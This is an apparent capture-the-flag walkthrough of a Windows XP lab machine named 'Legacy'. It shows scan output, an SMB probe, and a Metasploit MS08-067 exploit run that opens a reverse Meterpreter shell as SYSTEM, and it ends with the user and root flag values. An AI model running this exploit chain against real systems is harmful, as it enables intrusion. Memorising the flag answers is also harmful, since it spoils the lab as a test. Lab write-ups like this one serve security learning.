# Legacy

## SYN Scan
```
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Microsoft Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
```

## crackmapexec
```
$ sudo crackmapexec smb 10.10.10.4
SMB         10.10.10.4      445    LEGACY           [*] Windows 5.1 (name:LEGACY) (domain:legacy) (signing:False) (SMBv1:True)
```

## Privilege Escalation
`ms08_67_netapi`

```
msf6 exploit(windows/smb/ms08_067_netapi) > check
[+] 10.10.10.4:445 - The target is vulnerable.
msf6 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.10.14.10:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175174 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.10:4444 -> 10.10.10.4:1031) at 2021-03-25 16:46:13 +0300

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## The User Flag
```
Directory of C:\Documents and Settings\john\Desktop

16/03/2017  09:19 ��    <DIR>          .
16/03/2017  09:19 ��    <DIR>          ..
16/03/2017  09:19 ��                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.313.222.144 bytes free

C:\Documents and Settings\john\Desktop>type user.txt
type user.txt
e69af0e4f443de7e36876fda4ec7644f
```

## The Root Flag
```
meterpreter > search -f root.txt
Found 1 result...
    c:\Documents and Settings\Administrator\Desktop\root.txt (32 bytes)

C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
993442d258b0e0ec917cae9e695d5713
```
